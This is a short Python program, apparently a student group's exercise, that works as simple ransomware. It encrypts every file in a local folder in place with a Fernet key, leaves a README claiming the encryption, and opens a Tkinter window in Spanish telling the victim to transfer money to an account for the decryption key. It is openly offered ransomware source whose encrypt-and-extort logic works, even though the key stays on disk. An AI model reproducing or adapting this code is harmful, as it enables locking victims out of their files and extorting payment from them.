from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk
import os


# ************************ ENCRIPTACION ******************************

def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


def load_key():
    return open('key.key', 'rb').read()


#items to encrypt
#our key
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)


def encrypt_files():
    path_to_encrypt = './files'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]
    generate_key()
    key = load_key()

    encrypt(full_path, key)

    with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
        file.write('Files encrypted by Group 9\n')
        




# ************************ DESENCRIPTACION ******************************


def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)

        with open(item, 'wb') as file_write:
            file_write.write(decrypted_data)


def decrypt_files(input_key):
    key = load_key()
    print(key.decode('UTF-8'))
    
    if key.decode('UTF-8') != input_key:
      return False
    
    path_to_encrypt = './files'
    os.remove(path_to_encrypt + '/' + 'README.txt')

    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]

    decrypt(full_path, key)
    return True





# ************************ PANTALLA ******************************

def verify_key():
  key = entry.get()
  ret = decrypt_files(key);
  
  if ret: 
    label4.config(text = 'Se desencriptaron los archivos')
  else:
    label4.config(text = 'Clave incorrecta')
  
  
  
  
if __name__ == '__main__':
  encrypt_files();
  
  win = Tk()
  win.geometry("450x300")
  win.title("Ransomware")
  
  
  label1=Label(win, text="Sus archivos fueron encriptados", font=("Courier 14 bold")).pack(pady=10)
  label2=Label(win, text="Transfiera a la cuenta ... para obtener \nla clave para desencriptarlos", font=("Courier 12 bold")).pack(pady=5)
  label3=Label(win, text="Ingrese la clave", font=("Courier 14 bold")).pack(pady=5)
  
  # Input del usuario
  entry= Entry(win, width= 60)
  entry.focus_set()
  entry.pack(padx = 10, pady=10)
  
   
  ttk.Button(win, text="Aceptar",width=20, command=verify_key).pack(pady=20)
  
  label4=Label(win, text="", font=("Courier 14 bold"))
  label4.pack(pady=5)
  
  win.mainloop()  
  
  
